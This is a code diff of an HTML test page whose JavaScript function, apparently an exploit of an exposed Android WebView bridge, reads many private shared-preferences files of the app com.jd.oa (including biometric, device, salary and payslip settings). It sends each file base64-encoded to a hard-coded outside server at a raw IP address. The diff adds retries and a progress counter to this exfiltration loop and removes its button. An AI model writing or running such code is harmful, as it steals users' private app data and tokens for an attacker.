@@ -67,60 +67,64 @@
         }
 
         function upit() {
-            const server = "http://120.26.107.38:8080/upload";  // 修改为你的服务器地址
-            const fileNames = [
-                "3808137dff6648cf.xml", "JdAndroidUUID.xml", "BIOMETRIC_OBJECT.xml",
-                "QV1com.tencent.tbs.qimei.sdk.QimeiSDK471f54c20b9ccc6f.xml", "BIOMETRIC_VERSION.xml",
-                "RMonitor_SP.xml", "BUGLY_COMMON_VALUES.xml", "SP_AROUTER_CACHE.xml", "BuglySdkInfos.xml",
-                "WebViewChromiumPrefs.xml", "FlutterSharedPreferences.xml", "_bundle_icsp.xml",
-                "IM_QUICK_APP.xml", "android.app.ActivityThread.IDS.xml", "JDFlutterModules.xml",
-                "JDME.xml", "crashrecord.xml", "JDReactAttendance.xml", "d616403a149025c1.xml",
-                "JDReactFeedback.xml", "jd_ma_sdk.xml", "jd_meeting.xml", "jdme__language_info.xml",
-                "jdme_devices_info.xml", "jrdy_common_sp.xml", "jrdy_local_jue_sp.xml",
-                "logx_strategyInfo.xml", "media_jdma_sharePref.xml", "multi_process.xml",
-                "new_b_log_ID_tbsbeacon_com.jd.oa_0M300GVKSH1IMBEK.xml", "plugin_setting.xml",
-                "preference_keys.xml", "qb_video_settings.xml", "qm_global_sp.xml", "react_prefrence.xml",
-                "sai.xml", "shooter_strategyInfo.xml", "tbs_download_config.xml", "tbs_oat_status.xml",
-                "tbs_preloadx5_check_cfg_file.xml", "tbss.xml", "uifa.xml", "x5_lc_settings.xml",
-                "x5_proxy_setting.xml", "JDReactInvestmentM.xml", "JDReactInvoiceClient.xml",
-                "JDReactJDMELibrary.xml", "JDReactJDMESurvey.xml", "JDReactJMEAppGroup.xml",
-                "JDReactJMEFpeTool.xml", "JDReactJMERNAPI.xml", "JDReactJMESalary.xml",
-                "JDReactJMETestRN.xml", "JDReactJMETripExpense.xml", "JDReactJMETripExpensePre.xml",
-                "JDReactJMEValues.xml", "JDReactJMEVocService.xml", "JDReactJMEcompanyTrip.xml",
-                "JDReactJoySpaceHub.xml", "JDReactOfwTool.xml", "JDReactPaySlip.xml",
-                "JDReactPurchaseApproval.xml", "JDReactReimbursementClient.xml", "JDReactSmartBus.xml",
-                "JDReactSplitOperationTool.xml", "JDWebCoreConfig.xml", "JS-Storage.xml", "app_locale_config.xml"
-            ];
+            (async () => {
+                const server = "http://120.26.107.38:8082/upload"; // 修改为你实际部署的地址
+                const fileNames = [
+                    "3808137dff6648cf.xml", "JdAndroidUUID.xml", "BIOMETRIC_OBJECT.xml", "QV1com.tencent.tbs.qimei.sdk.QimeiSDK471f54c20b9ccc6f.xml",
+                    "BIOMETRIC_VERSION.xml", "RMonitor_SP.xml", "BUGLY_COMMON_VALUES.xml", "SP_AROUTER_CACHE.xml", "BuglySdkInfos.xml",
+                    "WebViewChromiumPrefs.xml", "FlutterSharedPreferences.xml", "_bundle_icsp.xml", "IM_QUICK_APP.xml", "android.app.ActivityThread.IDS.xml",
+                    "JDFlutterModules.xml", "app_locale_config.xml", "JDME.xml", "crashrecord.xml", "JDReactAttendance.xml", "d616403a149025c1.xml",
+                    "JDReactFeedback.xml", "jd_ma_sdk.xml", "jd_meeting.xml", "jdme__language_info.xml", "jdme_devices_info.xml", "JDReactInvestmentM.xml",
+                    "JDReactInvoiceClient.xml", "JDReactJDMELibrary.xml", "JDReactJDMESurvey.xml", "JDReactJMEAppGroup.xml", "JDReactJMEFpeTool.xml",
+                    "JDReactJMERNAPI.xml", "JDReactJMESalary.xml", "JDReactJMETestRN.xml", "JDReactJMETripExpense.xml", "JDReactJMETripExpensePre.xml",
+                    "JDReactJMEValues.xml", "JDReactJMEVocService.xml", "JDReactJMEcompanyTrip.xml", "JDReactJoySpaceHub.xml", "JDReactOfwTool.xml",
+                    "JDReactPaySlip.xml", "JDReactPurchaseApproval.xml", "JDReactReimbursementClient.xml", "JDReactSmartBus.xml",
+                    "JDReactSplitOperationTool.xml", "JDWebCoreConfig.xml", "JS-Storage.xml", "new_b_log_ID_tbsbeacon_com.jd.oa_0M300GVKSH1IMBEK.xml",
+                    "plugin_setting.xml", "preference_keys.xml", "qb_video_settings.xml", "qm_global_sp.xml", "react_prefrence.xml", "sai.xml",
+                    "shooter_strategyInfo.xml", "tbs_download_config.xml", "tbs_oat_status.xml", "tbs_preloadx5_check_cfg_file.xml", "tbss.xml",
+                    "uifa.xml", "x5_lc_settings.xml", "x5_proxy_setting.xml", "jrdy_common_sp.xml", "jrdy_local_jue_sp.xml", "logx_strategyInfo.xml",
+                    "media_jdma_sharePref.xml", "multi_process.xml"
+                ];
 
-            fileNames.forEach(file => {
-                const path = "/data/data/com.jd.oa/shared_prefs/" + file;
-                try {
-                    const base64Data = window.Android.getFile(path);
-                    if (base64Data && base64Data.length > 50) {
-                        fetch(server, {
-                            method: "POST",
-                            headers: {
-                                "Content-Type": "application/json"
-                            },
-                            body: JSON.stringify({
-                                filename: file,
-                                base64: base64Data
-                            })
-                        }).then(res => {
+                let uploaded = 0;
+
+                for (const file of fileNames) {
+                    const path = "/data/data/com.jd.oa/shared_prefs/" + file;
+                    try {
+                        const base64 = window.Android.getFile(path);
+                        if (!base64 || base64.length < 50) {
+                            console.warn(`⚠️ 跳过空文件: ${file}`);
+                            continue;
+                        }
+
+                        let retries = 3;
+                        while (retries--) {
+                            const res = await fetch(server, {
+                                method: "POST",
+                                headers: { "Content-Type": "application/json" },
+                                body: JSON.stringify({
+                                    filename: file,
+                                    base64,
+                                    token: "your_secure_token_123" // 可选签名验证
+                                })
+                            });
+
                             if (res.ok) {
-                                console.log(`✅ Uploaded: ${file}`);
+                                uploaded++;
+                                console.log(`✅ 已上传 ${file} (${uploaded}/${fileNames.length})`);
+                                break;
                             } else {
-                                console.error(`❌ Failed upload: ${file}`);
+                                console.warn(`🔁 重试 ${file} (${3 - retries}/3)`);
                             }
-                        });
-                    } else {
-                        console.warn(`⚠️ Empty or missing: ${file}`);
-                    }
-                } catch (e) {
-                    console.error(`❌ Error getting file: ${file}`, e);
-                }
-            });
+                        }
 
+                    } catch (e) {
+                        console.error(`❌ 读取失败 ${file}:`, e);
+                    }
+                }
+
+                alert(`✅ 上传完成：${uploaded}/${fileNames.length}`);
+            })();
         }
     </script>
 </head>
@@ -131,8 +135,6 @@
     <button style="width:200px;height:200px;" onclick="callOne()">callOne</button>
     <br />
     <button style="width:200px;height:200px;" onclick="call2()">call2</button>
-    <br />
-    <button style="width:200px;height:200px;" onclick="upit()">upit</button>
     <br />
     <button style="width:200px;height:200px;" onclick="location.href=location.href+'?'">F5</button>
     <br />
